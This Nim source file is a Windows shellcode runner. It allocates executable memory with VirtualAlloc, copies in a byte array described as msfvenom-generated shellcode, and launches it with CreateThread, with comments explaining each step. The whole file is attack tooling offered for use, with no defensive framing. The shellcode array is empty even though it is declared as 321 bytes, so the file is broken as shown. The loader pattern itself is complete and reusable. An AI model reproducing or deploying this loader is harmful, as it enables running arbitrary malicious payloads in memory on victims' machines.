import winim  # import winim library for direct interface with winapi function

# basic shellcode generated with msfvenom 
let shellcode: array[321, byte] = [
byte ]

# Using a pointer that will hold the memory address returned by VirtualAlloc()
let rPtr = VirtualAlloc(
    nil,                        
    cast[SIZE_T](shellcode.len), 
    MEM_COMMIT, 
    PAGE_EXECUTE_READWRITE
    )

# validation 
if rPtr == NULL:
    echo "virtual memory allocation failed"
else: 
    echo "virtual memory allocation success"

# so now we can write our shellcode to that memory address
copyMem(rPtr, addr(shellcode), shellcode.len)

# let's use CreateThread() to execute the shellcode
let thread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](rPtr), nil, 0, nil)

if thread == cast[HANDLE](NULL):
    echo "threading failed"
else:
    echo "threading success"

# have to tell computer to wait for process to execute 
WaitForSingleObject(thread, INFINITE)
